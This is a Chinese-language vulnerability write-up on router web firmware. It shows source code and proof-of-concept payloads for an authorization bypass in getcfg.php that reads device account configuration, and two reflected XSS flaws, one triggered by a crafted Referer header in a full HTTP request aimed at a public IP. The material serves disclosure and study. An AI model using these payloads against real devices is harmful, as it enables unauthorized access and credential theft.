###  任意文件读取getcfg

getcfg.php

``` 
if(is_power_user() == 1)
	{
		/* cut_count() will return 0 when no or only one token. */
		$SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
		TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
		$SERVICE_INDEX = 0;
		while ($SERVICE_INDEX < $SERVICE_COUNT)
		{
			$GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
			TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
			if ($GETCFG_SVC!="")
			{
				$file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
				/* GETCFG_SVC will be passed to the child process. */
				if (isfile($file)=="1") dophp("load", $file);
			}
			$SERVICE_INDEX++;
		}
	}
```

POC

``` 
SERVICES=DEVICE.ACCOUNT&aaa=%0aAUTHORIZED_GROUP=1
```



![image-20191031111027019](.\image-20191031111027019.png)

可以读任意.xml.php文件

### 2.XSS

#### （1）文件位置parentalcontrols/register.php

```
			var Response = "<? echo $Response; ?>";
			function Body() {}
			Body.prototype =
			{
				OnLoad: function()
				{
					if(Response == "Unauthorized")
					{
						document.getElementById("authorize").style.display = "block";
					}
					else if(Response == "InternetUnreachable")
					{
						document.getElementById("InternetUnreach").style.display = "block";
					}
					else if(Response == "Devicebinded")
					{
						document.getElementById("device_binded").style.display = "block";
					}									
				},
				LoginSubmit: function(password_type, overwrite_deviceid)
				{
					if(password_type === "new") var pwd = document.getElementById("loginpwd").value;
					else var pwd = "<? echo $_GET["password"];?>";
					self.location.href = "/parentalcontrols/register.php?username=" + "<? echo $ADMIN_name;?>" + "&password=" + pwd + "&overriteDeviceID=" + overwrite_deviceid;
				},
				window_close: function()
				{
					window.opener=null;   
					window.open("","_self");   
					window.close();
				}						
			};
			var BODY = new Body();	
```

* else var pwd = "<? echo $_GET["password"];?>"; 构造即可直接触发

![image-20191031111539987](.\image-20191031111539987.png)



#### 2.文件位置/htdocs/webinc/js/tools_fw_rlt.php

代码

```php
		$referer = $_SERVER["HTTP_REFERER"];
		......
		$title = i18n("Language Pack Upload Fail");
		$message = "'".i18n("The language pack image is invalid.")."', "."'<a href=\"".$referer."\">".i18n("Click here to return to the previous page.")."</a>'";
```

$referer赋值点比较多，所以触发点也比较多。

POC

``` 
POST /tools_fw_rlt.php?PELOTA_ACTION=fwupdate HTTP/1.1
Host: 116.50.243.85
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Referer: </script><script>alert(11111)</script><script>
Cookie: uid=ScrWKA5Tlb
Connection: close
Upgrade-Insecure-Requests: 1

ACTION=langclear
```

![image-20191031205417181](.\image-20191031205417181.png)
